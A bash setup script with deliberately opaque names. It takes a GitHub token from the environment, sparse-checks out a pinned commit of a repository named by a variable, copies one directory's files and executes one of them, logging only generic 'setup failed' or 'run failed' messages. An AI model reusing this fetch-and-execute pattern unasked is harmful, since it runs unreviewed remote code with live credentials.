#!/usr/bin/env bash
set -euo pipefail
set +x

f() {
  printf '%s\n' "$1" >&2
  exit 1
}

s() {
  local n="$1"
  if [ "${!n+x}" != "x" ]; then
    f "setup failed"
  fi
}

n() {
  local n="$1"
  s "$n"
  if [ -z "${!n}" ]; then
    f "setup failed"
  fi
}

a() {
  local q="$1"
  if [[ ! "$q" =~ ^x[a-z2-7]{10}$ ]]; then
    f "setup failed"
  fi
}

b() {
  local q="$1"
  if [[ ! "$q" =~ ^x[a-z2-7]{10}(,x[a-z2-7]{10})*$ ]]; then
    f "setup failed"
  fi
}

h() {
  local q="$1"
  if [[ ! "$q" =~ ^[0-9a-f]{40}$ ]]; then
    f "setup failed"
  fi
}

n xsqhumm4yv2
n x7e4ac6wlux
n x7jaw5s4z43
n xyznpycmpkf
a "${xyznpycmpkf}"
s xypivk5mewi
if [ -n "${xypivk5mewi:-}" ]; then
  b "${xypivk5mewi}"
fi

d="$(mktemp -d)"
c() {
  rm -rf "$d"
}
trap c EXIT

t="$d/r"
q="$d/q"
l="$d/l"
o="$d/o"
mkdir -p "$t" "$q"

export GH_TOKEN="${x7jaw5s4z43}"
r="${xsqhumm4yv2}"
v="${x7e4ac6wlux}"
k="${xyznpycmpkf}"
h "$v"

git -C "$q" init --quiet
git -C "$q" config credential.helper ""
git -C "$q" config credential.https://github.com.helper "!gh auth git-credential"
git -C "$q" remote add origin "https://github.com/${r}.git"
git -C "$q" sparse-checkout init --cone
git -C "$q" sparse-checkout set "x/${k}"

g() {
  local n
  for n in 1 2 3 4; do
    if GIT_TERMINAL_PROMPT=0 git -C "$q" fetch --quiet --no-tags --depth=1 --filter=blob:none origin "$v" 2>"$l"; then
      return
    fi
    sleep 2
  done
  f "setup failed"
}

g
GIT_TERMINAL_PROMPT=0 git -C "$q" checkout --quiet --detach FETCH_HEAD 2>"$l" || f "setup failed"
git -C "$q" rev-parse HEAD >"$d/v" 2>"$l" || f "setup failed"
read -r w <"$d/v"
[ "$w" = "$v" ] || f "setup failed"
u="$q/x/${k}"
[ -d "$u" ] || f "setup failed"
if find "$u" -mindepth 1 -maxdepth 1 ! -type f -print -quit | grep -q .; then
  f "setup failed"
fi
cp "$u"/* "$t/"
find "$t" -mindepth 1 -maxdepth 1 -type f -exec chmod 600 {} +
chmod 700 "$t/x"

export xvkpmfi7bzn="$o"
"$t/x" >"$l" 2>&1 || f "run failed"
